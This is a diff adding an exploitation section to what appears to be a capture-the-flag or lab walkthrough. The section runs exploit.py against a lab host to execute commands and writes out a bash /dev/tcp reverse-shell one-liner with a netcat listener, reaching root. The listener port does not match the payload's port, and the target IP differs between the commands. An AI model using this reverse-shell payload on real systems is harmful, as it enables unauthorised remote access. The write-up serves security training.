@@ -116,14 +116,26 @@ Now that we are done with that, lets go ahead and exploit this vulnerability
 <h2>Exploitation</h2>
 So, we are going to run this exploit and we see what happens
 
+>command:python3 exploit.py --master 192.168.223.62  --exec whoami 
 
+![image](https://user-images.githubusercontent.com/126628077/222032537-6f4f6ee1-5ba2-40ed-950f-5c7ac6a35815.png)
 
+since the "whoami" command got executed successfully, this means we can go ahead to create a reverse shell so we can get a shell back on our kali
 
+We'll be using 2 different terminals, on the first terminal you run the exploit while on the second terminal you set up your netcat listener
 
+>command (first termminal):python3 exploit.py --master 192.168.87.62  --exec "bash -i >& /dev/tcp/192.168.49.87/1234 0>&1"
+>command (second terminal):rlwrap nc -lvnp 80
 
+_Ensure you change the IP to your IP address_
 
+![image](https://user-images.githubusercontent.com/126628077/222035586-a0fbc95a-1fea-4299-b39f-fd75b6802081.png)
 
+![image](https://user-images.githubusercontent.com/126628077/222035626-72755ff8-ef16-4f28-9180-bf900940d35e.png)
 
+Boom!!! We got a shell as root.
+
+Now that we have gotten the root shell our work is done
 
 
 
